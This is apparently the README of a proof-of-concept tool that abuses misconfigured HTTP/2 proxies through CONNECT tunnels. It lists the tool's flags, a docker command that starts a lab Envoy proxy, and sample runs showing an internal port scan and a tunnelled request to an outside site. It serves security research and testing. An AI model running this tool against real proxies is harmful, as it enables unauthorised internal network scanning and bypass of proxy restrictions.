POC tool to abuse misconfigured HTTP/2 proxies.

Usage:
```
Usage of ./http2ConnTun:
  -b int
    	Batch size for port scanning (default 100)
  -c	POC mode to create a single CONNECT tunnel, issue a HTTP/1 GET request and print the result
  -k	Use TLS in POC mode
  -p string
    	Port(s) to scan or connect to, format similar to nmap e.g. 80,443,1000-2000
  -t string
    	Pause time in between batches for port scanning e.g. "1s" (default "1s")
  -u string
    	Target host(s) e.g. "example.com" or "1.2.3.4,10.0.1/24" (default "example.com")
  -v	Enable verbose logging
  -x string
    	Proxy address to connect to e.g. "http://172.17.0.2:8080" (default "http://172.17.0.2:10001")
```

Start an example envoy server with the provided configuration:
```bash
docker run --rm -v ./envoy.yaml:/envoy.yaml:ro envoyproxy/envoy:distroless-v1.35-latest -c /envoy.yaml
```

Examples:
```
└─$ ./http2ConnTun -u 172.17.0.1 -p 8000-9000
2025/09/06 21:10:08 INFO Connected to proxy
2025/09/06 21:10:16 INFO Found open port: 172.17.0.1:8888
```

```
└─$ ./http2ConnTun -u google.de -p 443 -k -c
2025/09/06 21:11:08 INFO Connected to proxy
2025/09/06 21:11:08 successfully written data
HTTP/1.1 301 Moved Permanently
Location: https://www.google.de/
Content-Type: text/html; charset=UTF-8
Content-Security-Policy-Report-Only: object-src 'none';base-uri 'self';script-src 'nonce-VluL-L66EKtfsrGIeAZ_Dw' 'strict-dynamic' 'report-sample' 'unsafe-eval' 'unsafe-inline' https: http:;report-uri https://csp.withgoogle.com/csp/gws/other-hp
Date: Sat, 06 Sep 2025 19:11:08 GMT
Expires: Mon, 06 Oct 2025 19:11:08 GMT
Cache-Control: public, max-age=2592000
Server: gws
Content-Length: 219
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF="https://www.google.de/">here</A>.
</BODY></HTML>
```